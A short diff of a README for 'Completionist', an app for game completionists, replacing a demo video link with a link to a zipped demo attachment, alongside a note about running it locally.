@@ -4,7 +4,7 @@ An app designed for game completionists which allows them to track their progres
 
 NOTE: Currently only available on localhost. Must have .env file to run.
 
-https://github.com/taylahlucas/Completionist/assets/53559103/2902dd9d-e1be-431f-91b8-9a85c4499336
+[demo-1.1.mov.zip](https://github.com/user-attachments/files/23588352/demo-1.1.mov.zip)
 
 # Setup & Run Locally
 
